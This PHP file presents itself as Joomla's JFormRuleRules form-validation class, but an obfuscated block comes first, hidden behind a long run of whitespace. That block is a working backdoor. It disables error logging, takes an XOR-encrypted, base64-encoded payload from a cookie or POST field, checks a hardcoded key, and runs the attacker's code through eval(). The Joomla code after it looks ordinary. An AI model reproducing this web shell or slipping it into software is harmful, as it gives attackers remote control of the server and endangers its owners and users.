<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['fb9b55'];global$fb9b55;$fb9b55=$GLOBALS;$fb9b55['cb57c0c93']="\x39\x2d\x56\x3e\x4a\x40\x51\x48\x61\x37\x5d\x4f\x23\x2a\x7e\x3d\x35\xd\x71\x3a\x28\x38\x75\x73\x62\x4b\x5b\x4d\x78\x79\x63\x50\x47\x2c\x7d\x2b\x57\x2f\x3b\x4c\x5f\x7a\x6d\x3c\x29\x2e\x3f\x45\x55\x25\x9\x6b\x36\x68\x52\x44\x72\x27\x43\x7c\x5c\x5e\x58\x67\x65\x4e\x46\x34\xa\x20\x22\x41\x69\x6c\x5a\x30\x32\x54\x7b\x59\x60\x64\x70\x74\x6e\x77\x6f\x6a\x21\x33\x53\x66\x31\x26\x42\x24\x76\x49";$fb9b55[$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]=$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][53].$fb9b55['cb57c0c93'][56];$fb9b55[$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][75]]=$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][81];$fb9b55[$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]=$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][83].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][84];$fb9b55[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81]]=$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][84].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][83];$fb9b55[$fb9b55['cb57c0c93'][51].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][81]]=$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][41].$fb9b55['cb57c0c93'][64];$fb9b55[$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][89]]=$fb9b55['cb57c0c93'][82].$fb9b55['cb57c0c93'][53].$fb9b55['cb57c0c93'][82].$fb9b55['cb57c0c93'][96].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][84];$fb9b55[$fb9b55['cb57c0c93'][53].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][52]]=$fb9b55['cb57c0c93'][22].$fb9b55['cb57c0c93'][84].$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][41].$fb9b55['cb57c0c93'][64];$fb9b55[$fb9b55['cb57c0c93'][28].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]=$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][67].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][64];$fb9b55[$fb9b55['cb57c0c93'][18].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][16]]=$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][83].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][83].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][42].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][42].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][83];$fb9b55[$fb9b55['cb57c0c93'][82].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][91]]=$fb9b55['cb57c0c93'][85].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][8];$fb9b55[$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][67]]=$fb9b55['cb57c0c93'][51].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][89];$fb9b55[$fb9b55['cb57c0c93'][85].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][24]]=$_POST;$fb9b55[$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0]]=$_COOKIE;@$fb9b55[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81]]($fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][63],NULL);@$fb9b55[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81]]($fb9b55['cb57c0c93'][73].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][63].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][56].$fb9b55['cb57c0c93'][23],0);@$fb9b55[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81]]($fb9b55['cb57c0c93'][42].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][28].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][28].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][22].$fb9b55['cb57c0c93'][83].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][84].$fb9b55['cb57c0c93'][40].$fb9b55['cb57c0c93'][83].$fb9b55['cb57c0c93'][72].$fb9b55['cb57c0c93'][42].$fb9b55['cb57c0c93'][64],0);@$fb9b55[$fb9b55['cb57c0c93'][18].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][16]](0);$r0c7c037f=NULL;$af87cbab2=NULL;$fb9b55[$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][8]]=$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][67].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][1].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][67].$fb9b55['cb57c0c93'][1].$fb9b55['cb57c0c93'][67].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][1].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][1].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][30];global$od3fa;function k88ef5313($r0c7c037f,$sd641e81){global$fb9b55;$w36c21972="";for($y475c1931=0;$y475c1931<$fb9b55[$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]($r0c7c037f);){for($m4696de44=0;$m4696de44<$fb9b55[$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]($sd641e81)&&$y475c1931<$fb9b55[$fb9b55['cb57c0c93'][86].$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]($r0c7c037f);$m4696de44++,$y475c1931++){$w36c21972.=$fb9b55[$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]($fb9b55[$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][75]]($r0c7c037f[$y475c1931])^$fb9b55[$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][76].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][75]]($sd641e81[$m4696de44]));}}return$w36c21972;}function wcaa($r0c7c037f,$sd641e81){global$fb9b55;global$od3fa;return$fb9b55[$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][67]]($fb9b55[$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][67]]($r0c7c037f,$od3fa),$sd641e81);}foreach($fb9b55[$fb9b55['cb57c0c93'][64].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][0]]as$sd641e81=>$gecf80){$r0c7c037f=$gecf80;$af87cbab2=$sd641e81;}if(!$r0c7c037f){foreach($fb9b55[$fb9b55['cb57c0c93'][85].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][24]]as$sd641e81=>$gecf80){$r0c7c037f=$gecf80;$af87cbab2=$sd641e81;}}$r0c7c037f=@$fb9b55[$fb9b55['cb57c0c93'][53].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][52]]($fb9b55[$fb9b55['cb57c0c93'][82].$fb9b55['cb57c0c93'][16].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][91]]($fb9b55[$fb9b55['cb57c0c93'][28].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][81].$fb9b55['cb57c0c93'][89].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][30].$fb9b55['cb57c0c93'][9].$fb9b55['cb57c0c93'][81]]($r0c7c037f),$af87cbab2));if(isset($r0c7c037f[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][51]])&&$od3fa==$r0c7c037f[$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][51]]){if($r0c7c037f[$fb9b55['cb57c0c93'][8]]==$fb9b55['cb57c0c93'][72]){$y475c1931=Array($fb9b55['cb57c0c93'][82].$fb9b55['cb57c0c93'][96]=>@$fb9b55[$fb9b55['cb57c0c93'][24].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][8].$fb9b55['cb57c0c93'][52].$fb9b55['cb57c0c93'][89]](),$fb9b55['cb57c0c93'][23].$fb9b55['cb57c0c93'][96]=>$fb9b55['cb57c0c93'][92].$fb9b55['cb57c0c93'][45].$fb9b55['cb57c0c93'][75].$fb9b55['cb57c0c93'][1].$fb9b55['cb57c0c93'][92],);echo@$fb9b55[$fb9b55['cb57c0c93'][51].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][0].$fb9b55['cb57c0c93'][21].$fb9b55['cb57c0c93'][91].$fb9b55['cb57c0c93'][81]]($y475c1931);}elseif($r0c7c037f[$fb9b55['cb57c0c93'][8]]==$fb9b55['cb57c0c93'][64]){eval($r0c7c037f[$fb9b55['cb57c0c93'][81]]);}exit();} ?><?php
/**
 * @package     Joomla.Platform
 * @subpackage  Form
 *
 * @copyright   Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

use Joomla\Registry\Registry;

/**
 * Form Rule class for the Joomla Platform.
 *
 * @since  11.1
 */
class JFormRuleRules extends JFormRule
{
	/**
	 * Method to test the value.
	 *
	 * @param   SimpleXMLElement  $element  The SimpleXMLElement object representing the <field /> tag for the form field object.
	 * @param   mixed             $value    The form field value to validate.
	 * @param   string            $group    The field name group control value. This acts as as an array container for the field.
	 *                                      For example if the field has name="foo" and the group value is set to "bar" then the
	 *                                      full field name would end up being "bar[foo]".
	 * @param   Registry          $input    An optional Registry object with the entire data set to validate against the entire form.
	 * @param   JForm             $form     The form object for which the field is being tested.
	 *
	 * @return  boolean  True if the value is valid, false otherwise.
	 *
	 * @since   11.1
	 */
	public function test(SimpleXMLElement $element, $value, $group = null, Registry $input = null, JForm $form = null)
	{
		// Get the possible field actions and the ones posted to validate them.
		$fieldActions = self::getFieldActions($element);
		$valueActions = self::getValueActions($value);

		// Make sure that all posted actions are in the list of possible actions for the field.
		foreach ($valueActions as $action)
		{
			if (!in_array($action, $fieldActions))
			{
				return false;
			}
		}

		return true;
	}

	/**
	 * Method to get the list of permission action names from the form field value.
	 *
	 * @param   mixed  $value  The form field value to validate.
	 *
	 * @return  array  A list of permission action names from the form field value.
	 *
	 * @since   11.1
	 */
	protected function getValueActions($value)
	{
		$actions = array();

		// Iterate over the asset actions and add to the actions.
		foreach ((array) $value as $name => $rules)
		{
			$actions[] = $name;
		}

		return $actions;
	}

	/**
	 * Method to get the list of possible permission action names for the form field.
	 *
	 * @param   SimpleXMLElement  $element  The SimpleXMLElement object representing the <field /> tag for the
	 *                                      form field object.
	 *
	 * @return  array   A list of permission action names from the form field element definition.
	 *
	 * @since   11.1
	 */
	protected function getFieldActions(SimpleXMLElement $element)
	{
		$actions = array();

		// Initialise some field attributes.
		$section = $element['section'] ? (string) $element['section'] : '';
		$component = $element['component'] ? (string) $element['component'] : '';

		// Get the asset actions for the element.
		$elActions = JAccess::getActions($component, $section);

		// Iterate over the asset actions and add to the actions.
		foreach ($elActions as $item)
		{
			$actions[] = $item->name;
		}

		// Iterate over the children and add to the actions.
		foreach ($element->children() as $el)
		{
			if ($el->getName() == 'action')
			{
				$actions[] = (string) $el['name'];
			}
		}

		return $actions;
	}
}
